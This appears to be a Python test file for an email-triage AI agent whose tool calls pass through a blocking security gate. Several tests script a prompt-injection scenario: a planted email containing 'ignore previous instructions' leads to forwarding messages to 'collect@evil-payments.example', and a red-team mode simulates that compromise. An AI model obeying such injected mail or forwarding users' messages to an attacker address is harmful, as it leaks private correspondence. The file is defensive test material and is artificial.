"""The real loop, driven by a stand-in for the AI (no API key, no network)."""
import asyncio
import json
from types import SimpleNamespace as NS

from app.agent import run_agent
from app.contracts import Decision, GateResult, Outcome, Verdict
from app.mailbox import Mailbox


def tool_use(i, name, **args):
    return NS(type="tool_use", id=f"t{i}", name=name, input=args)


class FakeClient:
    """Plays back a list of responses; repeats the last one forever."""

    def __init__(self, responses):
        self.responses, self.calls = responses, []
        self.beta = NS(messages=NS(create=self._create))

    async def _create(self, **kw):
        self.calls.append({**kw, "messages": list(kw["messages"])})  # what the AI saw at that moment
        i = min(len(self.calls) - 1, len(self.responses) - 1)
        return self.responses[i]


def blocking_gate(seen):
    async def gate(action):
        seen.append(action)
        return GateResult(outcome=Outcome.BLOCKED,
                          decision=Decision(verdict=Verdict.BLOCK, rule_id="test", reason="no"))
    return gate


async def test_actions_go_to_the_gate_with_read_context_and_results_go_back_to_the_ai():
    client = FakeClient([
        NS(stop_reason="tool_use", content=[tool_use(1, "read_email", email_id="e09")]),
        NS(stop_reason="tool_use", content=[tool_use(2, "forward_email", email_id="e01",
                                                     to=["collect@evil-payments.example"])]),
        NS(stop_reason="end_turn", content=[NS(type="text", text="Done.")]),
    ])
    seen, mb = [], Mailbox()
    results = await run_agent(mb, blocking_gate(seen), "triage", client=client)
    assert [a.context_email_ids for a in seen] == [["e09"]]
    assert results[0].outcome is Outcome.BLOCKED and mb.outbox == []
    last_user = client.calls[-1]["messages"][-1]["content"][0]
    assert last_user["tool_use_id"] == "t2" and json.loads(last_user["content"])["outcome"] == "blocked"
    assert "ignore previous instructions" in client.calls[1]["messages"][2]["content"][0]["content"]


async def test_bad_tool_input_is_reported_to_the_ai_not_crashed():
    client = FakeClient([
        NS(stop_reason="tool_use", content=[tool_use(1, "read_email", email_id="e99")]),
        NS(stop_reason="end_turn", content=[]),
    ])
    await run_agent(Mailbox(), blocking_gate([]), "t", client=client)
    result = client.calls[1]["messages"][-1]["content"][0]
    assert result["is_error"] and "e99" in result["content"]


async def test_never_ending_agent_is_cut_off_at_max_steps():
    client = FakeClient([NS(stop_reason="tool_use", content=[tool_use(1, "list_emails")])])
    await run_agent(Mailbox(), blocking_gate([]), "t", client=client, max_steps=5)
    assert len(client.calls) == 5


async def test_hanging_gate_is_cut_off_by_the_timeout():
    async def slow_gate(action):
        await asyncio.sleep(10)
    client = FakeClient([NS(stop_reason="tool_use", content=[tool_use(1, "label_email", email_id="e01", label="x")])])
    results = await run_agent(Mailbox(), slow_gate, "t", client=client, timeout_s=0.2)
    assert results == []


async def test_red_team_simulates_the_compromise_after_the_trick_is_read(monkeypatch):
    def script():
        return FakeClient([
            NS(stop_reason="tool_use", content=[tool_use(1, "read_email", email_id="e01")]),
            NS(stop_reason="tool_use", content=[tool_use(2, "read_email", email_id="e09")]),
            NS(stop_reason="end_turn", content=[]),
        ])
    monkeypatch.delenv("AGENT_RED_TEAM", raising=False)
    seen = []; await run_agent(Mailbox(), blocking_gate(seen), "t", client=script())
    assert seen == []  # off by default: nothing is simulated
    monkeypatch.setenv("AGENT_RED_TEAM", "1")
    seen = []; client = script(); await run_agent(Mailbox(), blocking_gate(seen), "t", client=client)
    assert [(a.email_id, a.params["to"]) for a in seen] == [(e, ["collect@evil-payments.example"]) for e in ("e01", "e02", "e03")]
    assert all(a.rationale.startswith("[SIMULATED COMPROMISE]") and a.context_email_ids == ["e01", "e09"] for a in seen)
    assert all("RED-TEAM" not in c["system"] for c in client.calls)  # the AI itself is never told to misbehave
